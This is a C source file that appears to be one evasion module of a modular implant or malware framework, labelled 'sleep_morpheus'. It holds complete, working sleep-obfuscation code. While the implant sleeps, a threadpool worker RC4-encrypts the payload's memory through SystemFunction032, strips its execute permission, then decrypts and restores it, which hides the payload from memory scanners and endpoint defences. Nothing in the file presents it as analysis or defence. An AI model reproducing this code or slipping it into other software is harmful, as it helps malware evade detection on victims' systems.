// chunk: evasion/sleep_morpheus
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: low
// note: Threadpool-based sleep obfuscation — uses TpAllocWork/TpPostWork/TpReleaseWork from ntdll's internal threadpool API. The threadpool worker handles encrypt-sleep-decrypt, producing a different call stack from timer or thread approaches.

#ifndef CHUNK_SLEEP_MORPHEUS
#define CHUNK_SLEEP_MORPHEUS

typedef NTSTATUS (NTAPI *pfnSystemFunction032_mor)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

typedef NTSTATUS (NTAPI *pfnTpAllocWork_mor)(PTP_WORK *, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef void (NTAPI *pfnTpPostWork_mor)(PTP_WORK);
typedef void (NTAPI *pfnTpReleaseWork_mor)(PTP_WORK);

static volatile int g_morpheus_initialized = 0;
static pfnSystemFunction032_mor g_morph_SF032 = NULL;
static pfnTpAllocWork_mor g_morph_TpAlloc = NULL;
static pfnTpPostWork_mor g_morph_TpPost = NULL;
static pfnTpReleaseWork_mor g_morph_TpRelease = NULL;

static int morpheus_init(void) {
    if (g_morpheus_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!advapi || !ntdll) return 0;

    g_morph_SF032 = (pfnSystemFunction032_mor)GetProcAddress(advapi, "SystemFunction032");
    g_morph_TpAlloc = (pfnTpAllocWork_mor)GetProcAddress(ntdll, "TpAllocWork");
    g_morph_TpPost = (pfnTpPostWork_mor)GetProcAddress(ntdll, "TpPostWork");
    g_morph_TpRelease = (pfnTpReleaseWork_mor)GetProcAddress(ntdll, "TpReleaseWork");

    if (!g_morph_SF032 || !g_morph_TpAlloc || !g_morph_TpPost || !g_morph_TpRelease)
        return 0;

    g_morpheus_initialized = 1;
    return 1;
}

static void morph_crypt(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_morph_SF032(&data_blob, &key_blob);
}

typedef struct {
    BYTE *base;
    DWORD size;
    DWORD sleep_ms;
    BYTE key[16];
    HANDLE done_event;
} morph_ctx_t;

static void CALLBACK morph_work_callback(PTP_CALLBACK_INSTANCE instance, PVOID param, PTP_WORK work) {
    (void)instance; (void)work;
    morph_ctx_t *ctx = (morph_ctx_t *)param;

    // Encrypt the region
    morph_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

    // Remove execute permission
    DWORD old;
    VirtualProtect(ctx->base, ctx->size, PAGE_READWRITE, &old);

    // Sleep inside threadpool worker — different call stack than main thread
    Sleep(ctx->sleep_ms);

    // Restore + decrypt
    DWORD dummy;
    VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READWRITE, &dummy);
    morph_crypt(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));
    VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READ, &dummy);

    // Signal completion
    SetEvent(ctx->done_event);
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_morpheus_initialized && !morpheus_init()) {
        Sleep(ms);
        return;
    }

    morph_ctx_t ctx;
    ctx.base = base;
    ctx.size = size;
    ctx.sleep_ms = ms;
    ctx.done_event = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx.done_event) { Sleep(ms); return; }

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        ctx.key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0xC5 + 0x39));

    PTP_WORK work = NULL;
    NTSTATUS status = g_morph_TpAlloc(&work, morph_work_callback, &ctx, NULL);
    if (status != 0 || !work) {
        CloseHandle(ctx.done_event);
        Sleep(ms);
        return;
    }

    // Post work to threadpool — callback runs in a worker thread
    g_morph_TpPost(work);

    // Main thread waits for the worker to finish
    WaitForSingleObject(ctx.done_event, ms + 30000);

    g_morph_TpRelease(work);
    CloseHandle(ctx.done_event);
    SecureZeroMemory(ctx.key, sizeof(ctx.key));
}

#endif
